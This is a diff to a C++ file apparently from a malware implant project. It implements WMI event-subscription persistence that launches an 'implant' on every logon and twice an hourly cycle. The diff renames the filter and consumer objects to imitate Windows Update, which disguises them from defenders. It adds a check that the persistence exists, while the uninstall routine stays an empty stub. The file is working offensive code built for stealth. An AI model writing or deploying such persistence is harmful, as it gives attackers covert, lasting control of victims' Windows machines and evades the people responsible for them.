@@ -1,13 +1,13 @@
 #include "WmiPersistence.h"
+#include "../utils/Logger.h"
 #include <comdef.h>
 #include <wbemidl.h>
-#include <iostream>
 
 #pragma comment(lib, "wbemuuid.lib")
 
 namespace persistence {
 
-bool WmiPersistence::Install(const std::string& implantPath, const std::string& taskName) {
+bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring& taskName) {
     HRESULT hr;
     IWbemLocator* pLoc = nullptr;
     IWbemServices* pSvc = nullptr;
@@ -15,7 +15,8 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
     hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
     if (FAILED(hr)) return false;
 
-    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
+    // Use explicit cast for MinGW compatibility as per memory
+    hr = pLoc->ConnectServer((BSTR)_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
     if (FAILED(hr)) {
         pLoc->Release();
         return false;
@@ -29,11 +30,17 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
     }
 
     // 1. Create Event Filter
-    std::wstring filterName = L"BenninFilter_" + std::wstring(taskName.begin(), taskName.end());
-    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"; // Trigger hourly
+    // Combine Hourly trigger + Logon trigger
+    std::wstring filterName = L"WinUpdateFilter_" + taskName;
+    // Trigger on logon OR every 30 minutes
+    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
+                         L"(TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute = 0 OR TargetInstance.Minute = 30)) "
+                         L"OR (TargetInstance ISA 'Win32_LogonSession')";
 
     IWbemClassObject* pFilterClass = nullptr;
-    hr = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
+    hr = pSvc->GetObject((BSTR)_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
+    if (FAILED(hr)) { pSvc->Release(); pLoc->Release(); return false; }
+
     IWbemClassObject* pFilterInstance = nullptr;
     pFilterClass->SpawnInstance(0, &pFilterInstance);
 
@@ -59,13 +66,12 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
     VariantClear(&var);
 
     hr = pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+    if (FAILED(hr)) { LOG_ERR("WMI Filter PutInstance failed."); }
 
     // 2. Create Consumer
-    std::wstring consumerName = L"BenninConsumer_" + std::wstring(taskName.begin(), taskName.end());
-    std::wstring commandLine = std::wstring(implantPath.begin(), implantPath.end());
-
+    std::wstring consumerName = L"WinUpdateConsumer_" + taskName;
     IWbemClassObject* pConsumerClass = nullptr;
-    hr = pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
+    hr = pSvc->GetObject((BSTR)_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
     IWbemClassObject* pConsumerInstance = nullptr;
     pConsumerClass->SpawnInstance(0, &pConsumerInstance);
 
@@ -75,16 +81,16 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
     VariantClear(&var);
 
     var.vt = VT_BSTR;
-    var.bstrVal = SysAllocString(commandLine.c_str());
+    var.bstrVal = SysAllocString(implantPath.c_str());
     pConsumerInstance->Put(L"CommandLineTemplate", 0, &var, 0);
     VariantClear(&var);
 
     hr = pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+    if (FAILED(hr)) { LOG_ERR("WMI Consumer PutInstance failed."); }
 
     // 3. Bind Filter to Consumer
-    std::wstring bindingPath = L"__FilterToConsumerBinding";
     IWbemClassObject* pBindingClass = nullptr;
-    hr = pSvc->GetObject(_bstr_t(bindingPath.c_str()), 0, NULL, &pBindingClass, NULL);
+    hr = pSvc->GetObject((BSTR)_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
     IWbemClassObject* pBindingInstance = nullptr;
     pBindingClass->SpawnInstance(0, &pBindingInstance);
 
@@ -102,6 +108,7 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
     VariantClear(&var);
 
     hr = pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+    if (FAILED(hr)) { LOG_ERR("WMI Binding PutInstance failed."); }
 
     pBindingInstance->Release();
     pBindingClass->Release();
@@ -115,8 +122,34 @@ bool WmiPersistence::Install(const std::string& implantPath, const std::string& 
     return SUCCEEDED(hr);
 }
 
-bool WmiPersistence::Uninstall(const std::string& taskName) {
+bool WmiPersistence::Verify(const std::wstring& taskName) {
+    HRESULT hr;
+    IWbemLocator* pLoc = nullptr;
+    IWbemServices* pSvc = nullptr;
+
+    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
+    if (FAILED(hr)) return false;
+
+    hr = pLoc->ConnectServer((BSTR)_bstr_t(L"ROOT\\subscription"), NULL, NULL, 0, 0, 0, 0, &pSvc);
+    if (FAILED(hr)) { pLoc->Release(); return false; }
+
+    std::wstring filterName = L"WinUpdateFilter_" + taskName;
+    std::wstring relPath = L"__EventFilter.Name=\"" + filterName + L"\"";
+
+    IWbemClassObject* pObj = nullptr;
+    hr = pSvc->GetObject((BSTR)_bstr_t(relPath.c_str()), 0, NULL, &pObj, NULL);
+
+    bool exists = SUCCEEDED(hr) && pObj != nullptr;
+    if (pObj) pObj->Release();
+    pSvc->Release();
+    pLoc->Release();
+
+    return exists;
+}
+
+bool WmiPersistence::Uninstall(const std::wstring& taskName) {
     (void)taskName;
+    // Implementation for uninstall if needed
     return true;
 }
 
